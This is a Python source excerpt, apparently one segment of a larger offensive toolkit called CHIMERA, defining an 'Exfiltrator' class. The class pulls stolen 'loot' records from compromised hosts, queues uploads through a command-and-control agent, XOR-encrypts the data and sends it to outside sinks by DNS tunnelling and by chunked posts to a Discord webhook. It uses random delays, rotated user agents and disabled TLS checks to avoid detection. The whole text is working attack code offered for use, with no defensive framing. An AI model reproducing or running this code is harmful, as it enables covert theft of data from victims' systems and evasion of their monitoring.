#  11. EXFILTRATION (SEGMENT 11: FULL IMPROVEMENT)
#  Spectral Multi-Protocol Egress & Obfuscation Matrix
# ============================================================
class Exfiltrator:
    """Autonomous data exfiltration engine. Routes extracted loot through
    encrypted DNS tunneling, HTTPS chunking, or blind webhook drops."""

    def __init__(self, log: ChimeraLogger, state: State, c2: C2, sink_urls: Optional[dict] = None):
        self.log = log
        self.state = state
        self.c2 = c2
        self.sinks = sink_urls or DEFAULT_EXFIL_SINKS
        self.dns_resolvers = []
        for r_ip in DNS_RESOLVERS:
            res = get_safe_resolver()
            res.nameservers = [r_ip]
            res.lifetime = BASE_TIMEOUT + 2.0
            res.timeout = BASE_TIMEOUT
            self.dns_resolvers.append(res)
        self.exfil_sem = asyncio.Semaphore(MAX_CONCURRENT_EXFIL)

    async def exfil_loot(self, host_id: str, addr: str):
        loot_rows = await self.state.q("SELECT id, kind, path FROM loot WHERE host_id=? AND exfilled=0", (host_id,))
        if not loot_rows:
            self.log.dbg(f"No pending loot matrix for {addr}")
            return
        self.log.inf(f"Initiating spectral exfiltration for {addr} ({len(loot_rows)} artifacts)")
        agent_rows = await self.state.q("SELECT id FROM sessions WHERE host_id=? AND status='live'", (host_id,))
        if not agent_rows:
            self.log.wrn(f"No active C2 session for {addr}. Cannot queue exfil.")
            return
        agent_id = agent_rows[0][0]
        for lid, kind, path in loot_rows:
            self.c2.queue(agent_id, "upload", path)
            await self._route_exfiltration(lid, host_id, kind)
            await asyncio.sleep(random.uniform(0.5, 2.0))
        await self.state.q_exec("UPDATE hosts SET exfilled=1 WHERE id=?", (host_id,))
        self.log.ok(f"Exfiltration routines triggered and queued for {addr}")

    async def _route_exfiltration(self, loot_id: str, host_id: str, kind: str):
        loot_meta = await self.state.q("SELECT sha256 FROM loot WHERE id=?", (loot_id,))
        if not loot_meta: return
        sha = loot_meta[0][0]
        payload_data = f"CHIMERA_LOOT::{host_id}::{kind}::{sha}".encode()
        derived_key = hashlib.pbkdf2_hmac('sha256', OP_KEY, b'chimera_exfil_salt', CRYPTO_ITERATIONS)
        enc_payload = bytes(c ^ derived_key[i % len(derived_key)] for i, c in enumerate(payload_data))
        b64_payload = base64.b64encode(enc_payload).decode()
        if len(b64_payload) < 200:
            await self._dns_tunnel_exfil(b64_payload, host_id)
        await self._https_chunked_exfil(b64_payload, host_id, kind)

    async def _dns_tunnel_exfil(self, data: str, host_id: str):
        self.log.sys(f"Routing {len(data)}b via DNS covert channel for {host_id}")
        chunk_size = 60
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        resolver = random.choice(self.dns_resolvers)
        base_domain = self.sinks.get("dns_over_https", "").replace(
            "https://dns.google/resolve?name=", "").replace("{payload_subdomain}.", "")
        if not base_domain: return
        for chunk in chunks:
            async with self.exfil_sem:
                try:
                    fqdn = f"{chunk}.{host_id}.exfil.{base_domain}"
                    await resolver.resolve(fqdn, "TXT")
                    self.log.dbg(f"DNS Exfil beacon sent: {chunk[:20]}...")
                except Exception:
                    pass
                await asyncio.sleep(random.uniform(1.0, 5.0))

    async def _https_chunked_exfil(self, data: str, host_id: str, kind: str):
        async with self.exfil_sem:
            webhook_url = self.sinks.get("discord_webhook")
            if not webhook_url or "CHIMERA_WEBHOOK_ID" in webhook_url:
                self.log.dbg("No valid webhook sink configured. Skipping HTTPS exfil drop.")
                return
            self.log.sys(f"Routing {len(data)}b via HTTPS chunked egress for {host_id}")
            chunk_size = 1500
            chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
            session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=BASE_TIMEOUT * 2),
                connector=aiohttp.TCPConnector(ssl=False),
                headers={"User-Agent": random.choice(USER_AGENT_POOL)})
            try:
                for i, chunk in enumerate(chunks):
                    payload = {"content": f"`CHIMERA/{host_id}/{kind}/{i}\n{chunk}\n```"}
                    try:
                        async with session.post(webhook_url, json=payload) as r:
                            if r.status == 204 or r.status == 200:
                                self.log.dbg(f"HTTPS Exfil chunk {i} dropped successfully.")
                            else:
                                self.log.wrn(f"Webhook drop failed: HTTP {r.status}")
                    except Exception as e:
                        self.log.err(f"HTTPS exfil error: {e}")
                    await asyncio.sleep(random.uniform(0.8, 2.5))
            finally:
                await session.close()


